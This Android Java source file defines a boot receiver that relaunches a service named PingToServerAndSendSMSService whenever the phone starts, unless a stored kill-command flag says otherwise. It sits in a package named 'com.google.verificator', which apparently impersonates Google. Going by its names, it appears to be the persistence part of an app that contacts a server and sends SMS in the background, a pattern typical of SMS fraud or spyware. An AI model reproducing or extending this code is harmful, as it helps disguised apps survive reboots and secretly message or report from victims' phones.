package com.google.verificator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class PhoneBootStateReader extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        System.out.println(action + "PhoneBootStateReader------------------------");
        Intent myService = new Intent(context, PingToServerAndSendSMSService.class);
        if (AppGlobals.isKillCommandTrue() && PingToServerAndSendSMSService.getInstance() != null) {
            PingToServerAndSendSMSService.getInstance().stopSelf();
            AppGlobals.serviceRunning(false);
            AppGlobals.saveKillCommand(false);

        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(myService);
            } else {
                context.startService(myService);
            }
        }

    }
}
